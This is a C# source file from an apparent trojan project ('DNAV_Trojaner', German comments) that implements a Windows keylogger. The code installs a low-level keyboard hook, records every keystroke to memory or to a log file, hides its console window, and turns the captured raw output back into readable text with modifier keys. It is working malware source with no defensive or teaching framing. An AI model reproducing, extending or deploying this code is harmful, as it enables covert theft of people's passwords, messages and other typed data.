using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;



namespace DNAV_Trojaner
{
    public class Keylogger
    {
        private static string _keys = "";

        // 13 = Tastatur LowLevel Input, 14 = Maus LowLevel
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static bool _logFile = false;
        private static string _path;
        const int SW_HIDE = 0;

        /// <summary>
        /// Enthält die gedrückten Tasten
        /// </summary>
        public static string Keys
        {
            get
            {
                return Keylogger._keys;
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
        int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (Keylogger._logFile)
                {
                    StreamWriter sw = new StreamWriter(Keylogger._path, true);
                    sw.WriteLine("DOWN: " + (Keys)vkCode);
                    sw.Close();
                }
                Keylogger._keys += "DOWN: " + (Keys)vkCode + "\n";
            } else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (Keylogger._logFile)
                {
                    StreamWriter sw = new StreamWriter(Keylogger._path, true);
                    sw.WriteLine("UP: " + (Keys)vkCode);
                    sw.Close();
                }
                Keylogger._keys += "UP: " + (Keys)vkCode + "\n";
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        /// <summary>
        /// Aktiviert den Keylogger
        /// </summary>
        public static void Enable()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        /// <summary>
        /// Aktiviert den Keylogger und schreibt alle Tastenanschläge in eine Log Datei
        /// </summary>
        /// <param name="path"></param>
        public static void EnableWithLog(string path)
        {
            Keylogger._logFile = true;
            Keylogger._path = path;
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        /// <summary>
        /// Versteckt das Konsolenfenster
        /// </summary>
        public static void Hide()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        /// <summary>
        /// Bestimmt Groß- und Kleinschreibung durch die rohe Ausgabe des Trojaners 
        /// </summary>
        /// <param name="input"></param>
        /// <returns></returns>
        public static string CompileRawOutput(string input)
        {
            if(input == "")
            {
                return "";
            }

            string output = "";
            bool wasSpecial = false;
            bool isShift = false;
            bool isAlt = false;
            bool isCtrl = false;
            bool isWin = false;
            bool isAltGr = false;
            const string CTRL_KEY = "LControlKey\r";
            const string RCTRL_KEY = "RControlKey\r";
            const string SHFT_KEY = "LShiftKey\r";
            const string RSHFT_KEY = "RShiftKey\r";
            const string ALT_KEY = "LMenu\r";
            const string ALTGR_KEY = "RMenu\r";
            const string WIN_KEY = "LWin\r";
            const string RWIN_KEY = "RWin\r";
            const string CAPS_KEY = "Capital\r";

            string[] keys = input.Split('\n');

            foreach(string s in keys)
            {
                if(s != "")
                {
                    string[] temp = s.Split(' ');
                    if (temp[0] == "DOWN:")
                    {
                        switch (temp[1])
                        {
                            case CTRL_KEY:
                            case RCTRL_KEY:
                                isCtrl = true;
                                wasSpecial = true;
                                break;
                            case SHFT_KEY:
                            case RSHFT_KEY:
                                isShift = true;
                                wasSpecial = true;
                                break;
                            case ALT_KEY:
                                isAlt = true;
                                wasSpecial = true;
                                break;
                            case WIN_KEY:
                            case RWIN_KEY:
                                isWin = true;
                                wasSpecial = true;
                                break;
                            case ALTGR_KEY:
                                isAltGr = true;
                                wasSpecial = true;
                                break;
                        }
                    }
                    else
                    {
                        switch (temp[1])
                        {
                            case CTRL_KEY:
                            case RCTRL_KEY:
                                isCtrl = false;
                                break;
                            case SHFT_KEY:
                            case RSHFT_KEY:
                                isShift = false;
                                break;
                            case ALT_KEY:
                                isAlt = false;
                                break;
                            case WIN_KEY:
                            case RWIN_KEY:
                                isWin = false;
                                break;
                            case ALTGR_KEY:
                                isAltGr = false;
                                break;
                        }
                    }

                    if (temp[0] == "DOWN:" && !wasSpecial)
                    {
                        if (isCtrl)
                        {
                            output += "Ctrl + ";
                        }
                        if (isAlt)
                        {
                            output += "Alt + ";
                        }
                        if (isShift)
                        {
                            output += "Shift + ";
                        }
                        if (isWin)
                        {
                            output += "Win + ";
                        }
                        if (isAltGr)
                        {
                            output += "Alt Gr + ";
                        }
                        if (temp[1] != CTRL_KEY && temp[1] != RCTRL_KEY && temp[1] != SHFT_KEY && temp[1] != RSHFT_KEY && temp[1] != ALT_KEY && temp[1] != ALTGR_KEY && temp[1] != WIN_KEY && temp[1] != RWIN_KEY)
                        {
                            output += temp[1].ToLower();
                        }
                    }
                    wasSpecial = false;
                }
            }
            return output;
        }

    }
}
